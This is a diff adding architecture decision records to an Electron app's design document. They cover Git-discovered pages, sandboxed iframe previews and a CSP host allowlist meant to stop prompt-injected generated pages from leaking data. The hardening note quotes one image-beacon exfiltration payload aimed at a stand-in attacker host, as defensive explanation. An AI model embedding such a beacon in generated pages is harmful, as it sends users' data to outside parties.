@@ -576,6 +576,86 @@ Verify current documentation again before implementation because APIs and platfo
 - [Tauri](https://v2.tauri.app/start/)
 - [Capacitor](https://capacitorjs.com/docs)
 
+## Phase 2 Architecture Decisions
+
+### ADR 2026-07-24: Pages are discovered from Git (accepted, implemented)
+
+A design is one Git repository that may contain multiple pages. Every `*.html`
+file committed outside the managed `.build/` directory is a page; there is no
+page manifest and the agent never declares pages or an entry point. `index.html`
+is the home page when present, otherwise the first discovered page; a per-design
+`entry_page_path` preference can override it. A revision remains a single
+whole-design commit.
+
+This reverses the Phase 1 working assumption that a design was effectively a
+single `index.html` (see the deferred multi-file note in the Phase 1 audit).
+`readRevisionFiles` now reads every committed file via `git ls-tree`, so
+agent-authored assets, fonts, and per-page scripts flow through both the preview
+and the offline export. Tailwind compiles once across all pages into one shared
+`.build/tailwind.css`. Lightweight per-path page metadata (display title, order)
+lives in `design_pages`. Implemented in `designRepository.ts`, `compiler.ts`,
+`pages.ts`, `exportService.ts`, and store migration 29.
+
+### ADR 2026-07-24: Canvas preview via sandboxed iframes (accepted, implemented)
+
+Phase 1 rendered the preview in an isolated native `WebContentsView`. A canvas
+mode that lays every page out on one pan/zoom board needs an in-DOM surface, so
+the preview is now one sandboxed `<iframe sandbox="allow-scripts">` per page
+(opaque origin, no `allow-same-origin`) served over the `omnidesign-preview://`
+scheme with the restrictive preview CSP, plus an OmniDesign-injected shim
+(`previewShim.ts`) for content height, diagnostics forwarding, and current-page
+reporting. `previewServer.ts` registers the scheme on the default session and
+serves each revision's files by opaque token.
+
+A standalone Electron 43 harness validated the load-bearing assumptions before
+implementation (opaque-origin iframe loads relative `.build/*` subresources
+because the CSP uses the scheme source `omnidesign-preview:`, the height shim
+round-trips, and `connect-src 'none'` is enforced inside the frame). Two CSP
+changes land with it: the preview `frame-ancestors` is relaxed from `'none'` to
+the renderer origin (`file:` packaged, the dev origin in development), and the
+trusted-renderer CSP gains `frame-src omnidesign-preview:`.
+
+**The product owner cleared the isolation downgrade (2026-07-24).** Relative to
+the Phase 1 native view this gives up the
+OS-level process sandbox and dedicated session partition while keeping
+opaque-origin DOM/storage isolation, denied network egress (`connect-src 'none'`),
+the sandbox restrictions (no forms/popups/top-navigation), a `will-frame-navigate`
+guard against in-frame navigation to non-preview URLs, and the custom-protocol
+boundary. Diagnostics forward from the shim to the store; thumbnails are captured
+via `capturePage` of the on-screen iframe rect; pop-out opens a sandboxed window
+on the preview URL. The native freeze/detach occlusion dance is gone (DOM overlays
+paint over iframes naturally).
+
+**Hardening pass — external-resource allowlist (2026-07-27, done).** The preview
+CSP previously allowed subresources from any `https:` host, leaving a residual
+data-exfiltration channel: a generated (possibly prompt-injected) page could beacon
+to an attacker host with a plain resource GET (`<img src="https://attacker/?d=…">`)
+even with `connect-src 'none'`. `script-src`/`style-src`/`font-src`/`img-src` are
+now restricted to a curated allowlist of well-known font hosts, CDNs, and
+placeholder/stock-image services (`PREVIEW_ALLOWED_HOSTS` in `previewPolicy.ts`,
+the single source of truth shared by the CSP builder, `isAllowedPreviewResourceUrl`,
+and the agent contract in `agentHarness.ts`). A default-session `webRequest` filter
+independently enforces the same host list for HTTP(S) requests, while allowing the
+exact Vite renderer origin in development. This is possible now that Phase 2 supports
+local assets, so designs no longer need arbitrary CDNs.
+
+The Phase 2 hardening floor deliberately does not add a no-op shim nonce: the current
+generated-design contract permits inline scripts and Alpine directives, so adding a
+nonce source would make conforming browsers ignore `'unsafe-inline'` and break valid
+designs. Moving to Alpine's CSP runtime and removing inline/eval behavior would be a
+separate generated-runtime decision, not unfinished iframe hardening. An `app://`
+renderer migration was considered but is unnecessary for the accepted floor: packaged
+embedding is already restricted to `file:`, development to the exact Vite origin, and
+the preview scheme is not web-reachable.
+
+### ADR 2026-07-27: Focused preview remains unconstrained (accepted, implemented)
+
+Canvas mode simulates devices and therefore owns the persisted Phone, Tablet, Desktop,
+and custom dimensions plus Artboard/Fixed fit. Focused mode is for inspecting and using
+one page in all available workspace space; it intentionally fills the preview pane and
+does not apply simulated device dimensions. The selected page and view mode still
+persist per design.
+
 ## Rules for Changing This Architecture
 
 - Distinguish accepted decisions from proposals and experiments.
